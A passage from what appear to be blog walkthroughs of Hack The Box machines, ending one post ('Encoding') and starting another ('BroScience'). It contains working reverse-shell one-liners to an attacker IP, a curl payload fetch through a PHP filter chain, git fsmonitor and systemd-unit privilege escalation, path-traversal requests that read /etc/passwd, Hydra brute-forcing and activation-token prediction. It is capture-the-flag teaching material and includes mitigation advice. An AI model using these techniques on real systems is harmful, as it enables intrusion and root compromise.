groups=33(www-data)\\n\\x01\\xb2B\\x940\\xf8\\x00\\xf4\\x00\\xf4&gt;\\x00=\\x00=\\x0f\\x80\\x0f@\\x0fC\\xe0\\x03\\xd0\\x03\\xd0\\xf8\\x00\\xf4\\x00\\xf4&gt;\\x00=\\x00=\\x0f\\x80\\x0f@\\x0fC\\xe0\\x03\\xd0\\x03\\xd0\\xf8\\x00\\xf4\\x00\\xf4&gt;\\x00=\\x00=\\x0f\\x80\\x0f@\\x0fC\\xe0\\x03\\xd0\\x03\\xd0\\xf8\\x00\\xf4\\x00\\xf4&gt;\\x00=\\x00=\\x0f\\x80\\x0f@\\x0fC\\xe0\\x03\\xd0\\x03\\xd0\\xf8\\x00\\xf4\\x00\\xf4&gt;\\x00=\\x00=\\x0f\\x80\\x0f@\\x0fC\\xe0\\x03\\xd0\\x03\\xd0\\xf8\\x00\\xf4\\x00\\xf4&gt;\\x00=\\x00=\\x0f\\x80\\x0f@\\x0fC\\xe0\\x03\\xd0\\x03\\xd0\\xf8\\x00\\xf4\\x00\\xf4&gt;\\x00=\\x00=\\x0f\\x80\\x0f@\\x0f'The result of the command was returned with some junk.Next, I wrote a small script to open a reverse shell and used the filter to download it on the server.$ cat shell.php       &lt;?php`bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1'`;$ python php_filter_chain_generator.py  --chain '&lt;?php `curl 10.10.14.8/shell.php -o /tmp/shell.php`; ?&gt;'[+] The following gadget chain will generate the following code : &lt;?php `curl 10.10.14.8/shell.php -o /tmp/shell.php`; ?&gt; (base64 value: PD9waHAgYGN1cmwgMTAuMTAuMTQuOC9zaGVsbC5waHAgLW8gL3RtcC9zaGVsbC5waHBgOyA/Pg)php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7| ...$ python -m http.server 80                                                Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...Last, I used the second LFI to include the PHP file.'file_url' : \"http://image.haxtab‚ìõ‚ìîs.htb/actions/action_handler.php?page=/tmp/shell.php\"I got a hit on my netcat listener.$ nc -klvnp 4444listening on [any] 4444 ...connect to [10.10.14.8] from (UNKNOWN) [10.10.11.198] 46612bash: cannot set terminal process group (833): Inappropriate ioctl for devicebash: no job control in this shellwww-data@encoding:~/image/actions$ ls -lals -latotal 12drwxr-xr-x 2 svc svc 4096 Mar  5 18:21 .drwxr-xr-x 7 svc svc 4096 Mar  5 18:21 ..-rw-r--r-- 1 svc svc  191 Mar  5 18:21 action_handler.php-rw-r--r-- 1 svc svc    0 Mar  5 18:21 image2pdf.phpwww-data@encoding:~/image/actions$ whoamiwhoamiwww-dataGit ExploitOnce connected to the server I checked if I could run anything with sudo.www-data@encoding:~/image/actions$ sudo -lsudo -lMatching Defaults entries for www-data on encoding:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,    use_ptyUser www-data may run the following commands on encoding:    (svc) NOPASSWD: /var/www/image/scripts/git-commit.shI was able to run a script to commit changes in the image repository as the svc user.#!/bin/bashu=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)if [[ $u ]]; then        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -Aelse        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m \"Commited from API!\" --author=\"james &lt;james@haxtables.htb&gt;\"  --no-verifyfiThe script checks if there are any new files in the repository. If there are any, they are added to the index. If there are none, the code commits any changes, without running pre-commit hooks.I also saw a .gitconfig file in ‚Äò/var/www/‚Äô.www-data@encoding:~/image$ cat /var/www/.gitconfig[safe]        directory = /var/www/imageThe safe directory configuration allows using git configuration and hooks in the repository, even if they are not owned by the user running the command. That meant I could create a configuration that would be used when I ran the command as svc.I looked at the permissions on the git configuration. Only svc was able to write to the filesvc@encoding:/var/www/image$ ls -la /var/www/image/total 36drwxr-xr-x  7 svc  svc  4096 Mar  7 01:54 .drwxr-xr-x  5 root root 4096 Mar  7 01:54 ..drwxr-xr-x  2 svc  svc  4096 Mar  7 01:54 actionsdrwxr-xr-x  3 svc  svc  4096 Mar  7 01:54 assetsdrwxrwxr-x+ 8 svc  svc  4096 Mar  7 01:54 .gitdrwxr-xr-x  2 svc  svc  4096 Mar  7 01:54 includes-rw-r--r--  1 svc  svc    81 Mar  7 01:54 index.phpdrwxr-xr-x  2 svc  svc  4096 Mar  7 01:54 scripts-rw-r--r--  1 svc  svc  1250 Mar  7 01:54 utils.phpsvc@encoding:/var/www/image$ ls -la /var/www/image/.git/total 52drwxrwxr-x+  8 svc svc 4096 Mar  7 01:54 .drwxr-xr-x   7 svc svc 4096 Mar  7 01:54 ..drwxrwxr-x+  2 svc svc 4096 Mar  7 01:54 branches-rw-rwxr--+  1 svc svc   17 Mar  7 01:54 COMMIT_EDITMSG-rw-r--r--+  1 svc svc   92 Mar  7 01:54 config-rw-rwxr--+  1 svc svc   73 Mar  7 01:54 description-rw-rwxr--+  1 svc svc   23 Mar  7 01:54 HEADdrwxrwxr-x+  2 svc svc 4096 Mar  7 01:54 hooks-rw-rwxr--+  1 svc svc  821 Mar  7 01:54 indexdrwxrwxr-x+  2 svc svc 4096 Mar  7 01:54 infodrwxrwxr-x+  3 svc svc 4096 Mar  7 01:54 logsdrwxrwxr-x+ 22 svc svc 4096 Mar  7 01:54 objectsdrwxrwxr-x+  4 svc svc 4096 Mar  7 01:54 refsBut there was a + sign at the end of the file permissions. I had never seen that before. It meant there were additional permissions on the files.svc@encoding:/var/www/image$ getfacl .git# file: .git# owner: svc# group: svcuser::rwxuser:www-data:rwxgroup::r-xmask::rwxother::r-xsvc@encoding:/var/www/image$ getfacl .git/config# file: .git/config# owner: svc# group: svcuser::rw-user:www-data:r--group::r--mask::r--other::r--With those permissions, www-data could write in .git. So I could overwrite the config file.I added a command to run as the file system monitor in the existing ‚Äò.git/config‚Äô file and ran the script.www-data@encoding:/tmp$ cat /var/www/image/.git/config[core]        repositoryformatversion = 0        filemode = true        bare = false        logallrefupdates = true        fsmonitor = \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/4445 0&gt;&amp;1'\"www-data@encoding:/tmp$ sudo -u svc /var/www/image/scripts/git-commit.shI got a reverse shell as svc.$ nc -klvnp 4445listening on [any] 4445 ...connect to [10.10.14.8] from (UNKNOWN) [10.10.11.198] 57242svc@encoding:/var/www/image$svc@encoding:/var/www/image$ cdcdsvc@encoding:~$ ls -lals -latotal 40drwxr-x--- 5 svc  svc  4096 Jan 23 18:23 .drwxr-xr-x 3 root root 4096 Jan 13 16:25 ..lrwxrwxrwx 1 svc  svc     9 Nov 11 14:31 .bash_history -&gt; /dev/null-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrcdrwx------ 3 svc  svc  4096 Jan 13 16:25 .cache-rw-rw-r-- 1 svc  svc    85 Nov  8 16:37 .gitconfigdrwx------ 3 svc  svc  4096 Jan 13 16:25 .gnupg-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profiledrwx------ 2 svc  svc  4096 Jan 13 16:25 .ssh-rw-r----- 1 root svc    33 Mar  5 12:05 user.txtsvc@encoding:~$ cat user.txtcat user.txtREDACTEDSystemd ExploitThe svc user had a private ssh key in their home folder. I downloaded it to my machine and used it to reconnect. Then I looked for anything I could run with sudo.svc@encoding:~$ sudo -lMatching Defaults entries for svc on encoding:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser svc may run the following commands on encoding:    (root) NOPASSWD: /usr/bin/systemctl restart *I could restart a service with systemctl. I found a technique that created a new service by adding a file in ‚Äò/etc/systemd/system/‚Äô.Just as with the git repository, the normal file permissions did not allow me to write to the folder. But the ACL did.svc@encoding:/var/www/image$ ls -ld /etc/systemd/system/drwxrwxr-x+ 22 root root 4096 Mar 10 00:36 /etc/systemd/system/svc@encoding:/var/www/image$ getfacl /etc/systemd/system/getfacl: Removing leading '/' from absolute path names# file: etc/systemd/system/# owner: root# group: rootuser::rwxuser:svc:-wxgroup::rwxmask::rwxother::r-xI created a new service to open a reverse shell to my machine.svc@encoding:~$ cat root.service[Unit]Description=pwn[Service]Type=simpleUser=rootExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1'svc@encoding:~$ cp root.service /etc/systemd/system/sudo systemctl restart root.serviceWhen the service restarted, I got the shell in my listener.$ nc -klvnp 4444listening on [any] 4444 ...connect to [10.10.14.8] from (UNKNOWN) [10.10.11.198] 42394bash: cannot set terminal process group (5229): Inappropriate ioctl for devicebash: no job control in this shellroot@encoding:/# cat /root/root.txtcat /root/root.txtREDACTEDMitigationThere were 2 LFI vulnerabilities in this box. The first one had some validations, but it should have made sure that the scheme was http or https. The URL should also be validated with filter_var. This would have rejected the URL with the UTF-8.&lt;?php$url = 'http://haxtab‚ìõ‚ìîs.htb/test';echo 'Original: ' . $url . \"\\n\";echo 'Filtered: ' . filter_var($url, FILTER_VALIDATE_URL) . \"\\n\";$ php test.phpOriginal: http://haxtab‚ìõ‚ìîs.htb/testFiltered: The second LFI was caused by an include of the page passed by the user. This is looking for trouble. There should have been some validation around the page passed in. If the goal was to show a page of the application, the code should have kept an allowed list of pages and made sure the page was valid.Another issue was with the permissions in the git repository. The safe directory setting allowed running code as another user. Without it, my fsmonitor configuration would have been ignored. And the ACL allowed me to write to a file that should have been protected.The last issue with the permissions to restart any service in systemd. That should have allowed me to only restart the existing services. But since I was able to write in ‚Äò/etc/systemd/system/‚Äô, I was able to create a new service to restart and execute my code."
  },
  
  {
    "title": "Hack The Box - BroScience",
    "url": "/posts/HackTheBox-Walkthrough-BroScience/",
    "categories": "",
    "tags": "Walkthrough, Hacking, HackTheBox, Medium, Machine",
    "date": "2023-04-08 00:00:00 +0800",
    





    
    "snippet": "In this box, I had to exploit an LFI, a vulnerable token generation, and a serialization vulnerability to get to a shell. Then I had to crack a hashed password, and finally, get code execution in a...",
    "content": "In this box, I had to exploit an LFI, a vulnerable token generation, and a serialization vulnerability to get to a shell. Then I had to crack a hashed password, and finally, get code execution in a script running as root.  Room: BroScience  Difficulty: Medium  URL: https://app.hackthebox.com/machines/BroScience  Author: bmdyyEnumerationI began the box by scanning for open ports.$ rustscan -a target -- -A | tee rust.txt.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| || .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'The Modern Day Port Scanner._______________________________________: https://discord.gg/GFrQsGy           :: https://github.com/RustScan/RustScan : --------------------------------------üòµ https://admin.tryhackme.com[~] The config file is expected to be at \"/home/ehogue/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.Open 10.10.11.195:22Open 10.10.11.195:80Open 10.10.11.195:443[~] Starting Script(s)[&gt;] Script to be run Some(\"nmap -vvv -p  \")[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 08:25 ESTNSE: Loaded 155 scripts for scanning.NSE: Script Pre-scanning.NSE: Starting runlevel 1 (of 3) scan....PORT    STATE SERVICE  REASON  VERSION22/tcp  open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDB5dEat1MGh3CDDnkl4tdWQcTpdWZYHZj5/Orv3PDjSiQ4dg1i35kknwiZrXLiMsUu/4TigP9Kc3h4M1CS7E3/GprpWxuGmipEucoQuNEtaM0sUa8xobtFxOVF46kS0++ozTd4+zbSLsu73SlLcSuSFalhGnHteHj6/ksSeX642103SMqkkmEu/cbgofkoqQOCYk3Qa42bZq5bjS/auGAlPoAxTjjVtpHnXOKOU7M6gkewD91FB3GAMUdwqR/PJcA5xqGFZm2St9ecSbewCur6pLN5YKnNhvdID4ijWI22gu5pLxHL9XjORMbSUkJbB79VoYJZaNkdOgt+HXR67s9DWI47D6/+pO0dTfQgMFgOCxYheWMDQ2FuyHyGX1CZpMVLAo3sjOvxAqk7eUGutsyBAlYCD4lhSFs6RhSBynahHQah7+Lv5LKRriZe/fQIgrJrQj+tR4Uhz89eWGrXK9bjN22wy7tVkMG/w5dOwo7S3Wi0aTZfd/17D0z7wSdiAiE=|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCgM9UKdxFmXRJESXdlb+BSl+K1F0YCkOjSa8l+tgD6Y3mslSfrawZkdfq8NKLZlmOe8uf1ykgXjLWVDQ9NrJBk=|   256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMwR+IfRojCwiMuM3tZvdD5JCD2MRVum9frUha60bkN80/tcp  open  http     syn-ack Apache httpd 2.4.54|_http-title: Did not follow redirect to https://broscience.htb/|_http-server-header: Apache/2.4.54 (Debian)| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS443/tcp open  ssl/http syn-ack Apache httpd 2.4.54 ((Debian))|_ssl-date: TLS randomness does not represent time| tls-alpn:|_  http/1.1| http-cookie-flags:|   /:|     PHPSESSID:|_      httponly flag not set|_http-server-header: Apache/2.4.54 (Debian)|_http-title: BroScience : Home| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT/emailAddress=administrator@broscience.htb/localityName=Vienna| Issuer: commonName=broscience.htb/organizationName=BroScience/countryName=AT/emailAddress=administrator@broscience.htb/localityName=Vienna| Public Key type: rsa| Public Key bits: 4096| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2022-07-14T19:48:36| Not valid after:  2023-07-14T19:48:36| MD5:   5328ddd62f3429d11d26ae8a68d86e0c| SHA-1: 20568d0d9e4109cde5a22021fe3f349c40d8d75b| -----BEGIN CERTIFICATE-----...|_-----END CERTIFICATE-----Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 08:25Completed NSE at 08:25, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 08:25Completed NSE at 08:25, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 08:25Completed NSE at 08:25, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.49 secondsIt found three open ports.  22 - SSH  80 - HTTP  443 - HTTPSI looked at the site on port 80 and was redirected to ‚Äòhttps://broscience.htb/‚Äô. I added the domain to my hosts file.I launched Feroxbuster to check for hidden pages.$ feroxbuster -u https://broscience.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php -o ferox.txt -k -s 200,204,301,302,307,308,401,405 ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ü§ì                 ver: 2.7.3‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üéØ  Target Url            ‚îÇ https://broscience.htb/ üöÄ  Threads               ‚îÇ 50 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 405] üí•  Timeout (secs)        ‚îÇ 7 ü¶°  User-Agent            ‚îÇ feroxbuster/2.7.3 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml üíæ  Output File           ‚îÇ ferox.txt üí≤  Extensions            ‚îÇ [php] üèÅ  HTTP methods          ‚îÇ [GET] üîì  Insecure              ‚îÇ true üîÉ  Recursion Depth       ‚îÇ 4‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ301      GET        9l       28w      321c https://broscience.htb/includes =&gt; https://broscience.htb/includes/301      GET        9l       28w      319c https://broscience.htb/images =&gt; https://broscience.htb/images/200      GET      147l      510w        0c https://broscience.htb/200      GET       42l       97w     1936c https://broscience.htb/login.php200      GET      147l      510w        0c https://broscience.htb/index.php200      GET       45l      104w     2161c https://broscience.htb/register.php200      GET       29l       70w     1309c https://broscience.htb/user.php302      GET        0l        0w        0c https://broscience.htb/logout.php =&gt; https://broscience.htb/index.php302      GET        1l        3w       13c https://broscience.htb/comment.php =&gt; https://broscience.htb/login.php301      GET        9l       28w      319c https://broscience.htb/styles =&gt; https://broscience.htb/styles/301      GET        9l       28w      323c https://broscience.htb/javascript =&gt; https://broscience.htb/javascript/301      GET        9l       28w      319c https://broscience.htb/manual =&gt; https://broscience.htb/manual/301      GET        9l       28w      326c https://broscience.htb/manual/images =&gt; https://broscience.htb/manual/images/...200      GET       28l       66w     1256c https://broscience.htb/activate.php301      GET        9l       28w      331c https://broscience.htb/manual/en/programs =&gt; https://broscience.htb/manual/en/programs/301      GET        9l       28w      332c https://broscience.htb/manual/ru/developer =&gt; https://broscience.htb/manual/ru/developer/[####################] - 58s  3154400/3154400 0s      found:33      errors:1257183[####################] - 56s   126176/126176  2432/s  https://broscience.htb/[####################] - 0s    126176/126176  0/s     https://broscience.htb/includes/ =&gt; Directory listing (add -e to scan)[####################] - 0s    126176/126176  0/s     https://broscience.htb/images/ =&gt; Directory listing (add -e to scan)[####################] - 0s    126176/126176  0/s     https://broscience.htb/styles/ =&gt; Directory listing (add -e to scan)[####################] - 55s   126176/126176  2433/s  https://broscience.htb/javascript/[####################] - 54s   126176/126176  2578/s  https://broscience.htb/manual/[####################] - 0s    126176/126176  0/s     https://broscience.htb/manual/images/ =&gt; Directory listing (add -e to scan)[####################] - 55s   126176/126176  2297/s  https://broscience.htb/manual/en/[####################] - 0s    126176/126176  0/s     https://broscience.htb/manual/style/ =&gt; Directory listing (add -e to scan)[####################] - 53s   126176/126176  2547/s  https://broscience.htb/manual/en/misc/[####################] - 50s   126176/126176  2601/s  https://broscience.htb/manual/de/...[####################] - 48s   126176/126176  2616/s  https://broscience.htb/manual/ru/developer/Local File Inclusion (LFI)I opened ‚Äòhttps://broscience.htb‚Äô in my browser.I looked around the site. The user page appears to allow user enumeration.I extracted the list of users and tried to brute-force the login page with Hydra.$ cat usernames.txtadministratorbillmichaeljohndmytro$ hydra -L usernames.txt -P /usr/share/seclists/rockyou.txt -u -e sr -s 443 -m '/login.php:username=^USER^&amp;password=^PASS^:incorrect' broscience.htb https-post-form...It ran for a while and failed to find a working password.Next, I tried registering a user. But it needed activation of the account through a link sent by email.I kept looking around. Eventually, I saw the image‚Äôs URL: https://broscience.htb/includes/img.php?path=bench.png. This looked like it could be vulnerable to LFI.I tried loading https://broscience.htb/includes/img.php?path=/etc/passwd. The paged showed Error: Attack detected.I tried encoding the slashes, it gave me the same error. I kept playing with it, I needed to double URL encode the slashes to get the file.GET /includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1Host: broscience.htbCookie: PHPSESSID=6drat5f8omo5h6l5hmjinrcdaiUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Te: trailersConnection: closeHTTP/1.1 200 OKDate: Sun, 29 Jan 2023 16:33:15 GMTServer: Apache/2.4.54 (Debian)Content-Length: 2235Connection: closeContent-Type: image/pngroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologintss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/falsemessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinusbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologinsshd:x:108:65534::/run/sshd:/usr/sbin/nologindnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinavahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologinspeech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/falsepulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologinsaned:x:113:121::/var/lib/saned:/usr/sbin/nologincolord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologinDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsebill:x:1000:1000:bill,,,:/home/bill:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinpostgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash_laurel:x:998:998::/var/log/laurel:/bin/falseI tried using PHP filters to extract the source code of the application. The code was probably adding a folder name before the file name, so that failed.I tried to directly read a PHP file without a filter.GET /includes/img.php?path=..%252findex.php HTTP/1.1Host: broscience.htbCookie: PHPSESSID=6drat5f8omo5h6l5hmjinrcdaiUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Te: trailersConnection: closeIt worked!HTTP/1.1 200 OKDate: Tue, 31 Jan 2023 00:30:48 GMTServer: Apache/2.4.54 (Debian)Content-Length: 2182Connection: closeContent-Type: image/png&lt;?phpsession_start();?&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;BroScience : Home&lt;/title&gt;        &lt;?php         include_once 'includes/header.php';        include_once 'includes/utils.php';        $theme = get_theme();        ?&gt;        &lt;link rel=\"stylesheet\" href=\"styles/&lt;?=$theme?&gt;.css\"&gt;    &lt;/head&gt;    &lt;body class=\"&lt;?=get_theme_class($theme)?&gt;\"&gt;        &lt;?php include_once 'includes/navbar.php'; ?&gt;        &lt;div class=\"uk-container uk-margin\"&gt;            &lt;!-- TODO: Search bar --&gt;            &lt;?php            include_once 'includes/db_connect.php';                                // Load exercises            $res = pg_query($db_conn, 'SELECT exercises.id, username, title, image, SUBSTRING(content, 1, 100), exercises.date_created, users.id FROM exercises JOIN users ON author_id = users.id');            if (pg_num_rows($res) &gt; 0) {                echo '&lt;div class=\"uk-child-width-1-2@s uk-child-width-1-3@m\" uk-grid&gt;';                while ($row = pg_fetch_row($res)) {                    ?&gt;                    &lt;div&gt;                        &lt;div class=\"uk-card uk-card-default &lt;?=(strcmp($theme,\"light\"))?\"uk-card-secondary\":\"\"?&gt;\"&gt;                            &lt;div class=\"uk-card-media-top\"&gt;                                &lt;img src=\"includes/img.php?path=&lt;?=$row[3]?&gt;\" width=\"600\" height=\"600\" alt=\"\"&gt;                            &lt;/div&gt;                            &lt;div class=\"uk-card-body\"&gt;                                &lt;a href=\"exercise.php?id=&lt;?=$row[0]?&gt;\" class=\"uk-card-title\"&gt;&lt;?=$row[2]?&gt;&lt;/a&gt;                                &lt;p&gt;&lt;?=$row[4]?&gt;... &lt;a href=\"exercise.php?id=&lt;?=$row[0]?&gt;\"&gt;keep reading&lt;/a&gt;&lt;/p&gt;                            &lt;/div&gt;                            &lt;div class=\"uk-card-footer\"&gt;                                &lt;p class=\"uk-text-meta\"&gt;Written by &lt;a class=\"uk-link-text\" href=\"user.php?id=&lt;?=$row[6]?&gt;\"&gt;&lt;?=htmlspecialchars($row[1],ENT_QUOTES,'UTF-8')?&gt;&lt;/a&gt; &lt;?=rel_time($row[5])?&gt;&lt;/p&gt;                            &lt;/div&gt;                        &lt;/div&gt;                    &lt;/div&gt;                                        &lt;?php                }                echo '&lt;/div&gt;';            }             ?&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;I used that vulnerability to read all the PHP files I could find.Activation Code GenerationI extracted the code from /includes/utils.php. The first function was used to generate the activation code.function generate_activation_code() {    $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\";    srand(time());    $activation_code = \"\";    for ($i = 0; $i &lt; 32; $i++) {        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];    }    return $activation_code;}This code was used on user creation, and the generated code was needed to activate the new account.// Create the accountinclude_once 'includes/utils.php';$activation_code = generate_activation_code();$res = pg_prepare($db_conn, \"check_code_unique_query\", 'SELECT id FROM users WHERE activation_code = $1');$res = pg_execute($db_conn, \"check_code_unique_query\", array($activation_code));if (pg_num_rows($res) == 0) {    $res = pg_prepare($db_conn, \"create_user_query\", 'INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)');    $res = pg_execute($db_conn, \"create_user_query\", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));    // TODO: Send the activation link to email    $activation_link = \"https://broscience.htb/activate.php?code={$activation_code}\";    $alert = \"Account created. Please check your email for the activation link.\";    $alert_type = \"success\";} else {    $alert = \"Failed to generate a valid activation code, please try again.\";}The code was using the current time to seed the random generation. I was about to write a script that would generate and try every possible code for the last minute until it found one that worked. But I went back to the server response to user creation and saw that it was returning the server time.HTTP/1.1 200 OKDate: Tue, 31 Jan 2023 00:40:12 GMTServer: Apache/2.4.54 (Debian)...I used that time to generate a token and activate my account.&lt;?php$chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\";$time = strtotime('Tue, 31 Jan 2023 00:40:12 GMT');srand($time);$activation_code = \"\";for ($i = 0; $i &lt; 32; $i++) {    $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 